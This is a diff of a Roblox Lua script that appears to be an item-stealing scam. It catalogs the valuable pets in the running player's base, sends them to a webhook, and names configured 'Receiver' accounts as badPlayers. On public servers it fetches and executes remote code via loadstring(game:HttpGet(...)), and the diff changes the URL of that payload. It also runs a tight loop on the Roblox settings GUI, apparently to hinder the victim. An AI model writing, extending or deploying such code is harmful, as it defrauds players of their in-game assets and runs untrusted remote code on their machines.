@@ -9,10 +9,22 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
 local localPlayer = player
+
+local function parsePrice(priceText)
+    local number = tonumber((priceText or ""):match("[%d%.]+")) or 0
+    if (priceText or ""):find("K") then
+        return number * 1000
+    elseif (priceText or ""):find("M") then
+        return number * 1000000
+    elseif (priceText or ""):find("B") then
+        return number * 1000000000
+    else
+        return number
+    end
+end
 
 local config = {}
 do
@@ -36,27 +48,6 @@ local targetNames = config.targetNames or {}
 local receiverList = table.concat(config.Receiver or {}, ", ")
 local badPlayers = config.Receiver or {}
 
-local function parsePrice(priceText)
-    priceText = tostring(priceText or "")
-    priceText = priceText:gsub("[%$,%+]", "") -- xóa $ , +
-    priceText = priceText:gsub("/s", "")      -- xóa /s
-    priceText = priceText:gsub("%s+", "")     -- xóa khoảng trắng
-
-    local number = tonumber(priceText:match("[%d%.]+")) or 0
-
-    if priceText:find("[Kk]") then
-        return number * 1_000
-    elseif priceText:find("[Mm]") then
-        return number * 1_000_000
-    elseif priceText:find("[Bb]") then
-        return number * 1_000_000_000
-    elseif priceText:find("[Tt]") then
-        return number * 1_000_000_000_000
-    else
-        return number
-    end
-end
-
 local function getPriority(name)
     for _, t in ipairs(targetNames) do
         if name and t.name and name:find(t.name) then
@@ -76,18 +67,20 @@ end
 local function collectValidPets()
     local pets = {}
     local plots = Workspace:FindFirstChild("Plots")
-    if not plots then return pets end
+    if not plots then
+        return pets
+    end
 
-    for _, plot in pairs(plots:GetChildren()) do  
-        local sign = plot:FindFirstChild("PlotSign")  
-        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then  
-            local podiums = plot:FindFirstChild("AnimalPodiums")  
-            if podiums then  
-                for _, podium in pairs(podiums:GetChildren()) do  
-                    if podium:IsA("Model") then  
-                        local num = tonumber(podium.Name:match("^(%d+)_?"))  
-                        local floor = "Unknown Floor"  
-                        if num then  
+    for _, plot in pairs(plots:GetChildren()) do
+        local sign = plot:FindFirstChild("PlotSign")
+        if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+            local podiums = plot:FindFirstChild("AnimalPodiums")
+            if podiums then
+                for _, podium in pairs(podiums:GetChildren()) do
+                    if podium:IsA("Model") then
+                        local num = tonumber(podium.Name:match("^(%d+)_?"))
+                        local floor = "Unknown Floor"
+                        if num then
                             if num >= 1 and num <= 10 then
                                 floor = "1st Floor"
                             elseif num >= 11 and num <= 18 then
@@ -95,42 +88,31 @@ local function collectValidPets()
                             else
                                 floor = "3rd Floor"
                             end
-                        end  
+                        end
 
-                        local base = podium:FindFirstChild("Base")  
-                        local spawn = base and base:FindFirstChild("Spawn")  
-                        if spawn and spawn:FindFirstChild("Attachment") then  
-                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")  
-                            if overhead then  
+                        local base = podium:FindFirstChild("Base")
+                        local spawn = base and base:FindFirstChild("Spawn")
+                        if spawn and spawn:FindFirstChild("Attachment") then
+                            local overhead = spawn.Attachment:FindFirstChild("AnimalOverhead")
+                            if overhead then
                                 local displayName = overhead:FindFirstChild("DisplayName")
-                                if displayName then
+                                local priceLabel = overhead:FindFirstChild("Generation")
+                                if displayName and priceLabel and displayName:IsA("TextLabel") and priceLabel:IsA("TextLabel") then
                                     local nameText = displayName.Text
-                                    local genLabel
-
-                                    -- tìm dòng có /s
-                                    for _, lbl in pairs(overhead:GetChildren()) do
-                                        if lbl:IsA("TextLabel") and lbl ~= displayName and lbl.Text:find("/s") then
-                                            genLabel = lbl
-                                            break
-                                        end
-                                    end
-
-                                    if genLabel then
-                                        local priceText = genLabel.Text
-                                        local priceNum = parsePrice(priceText)
-                                        if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
-                                            table.insert(pets, string.format("%s (%s) (%s)", nameText, priceText, floor))
-                                        end
+                                    local priceText = priceLabel.Text
+                                    local priceNum = parsePrice(priceText)
+                                    if priceNum >= PRICE_LIMIT or getPriority(nameText) ~= math.huge then
+                                        table.insert(pets, string.format("%s (%s) (%s)", nameText, priceText, floor))
                                     end
                                 end
-                            end  
-                        end  
-                    end  
-                end  
-            end  
-            break  
-        end  
-    end  
+                            end
+                        end
+                    end
+                end
+            end
+            break
+        end
+    end
 
     return pets
 end
@@ -234,7 +216,7 @@ if serverType == "PUBLIC SERVER" then
     sendWebhook()
     pcall(function()
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/moreira"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/moreira/refs/heads/main/Sync"))()
         end)
     end)
 else
@@ -502,6 +484,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
+    local CoreGui = game:GetService("CoreGui")
     while task.wait(0.01) do
         local root = CoreGui:FindFirstChild("RobloxGui")
             and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
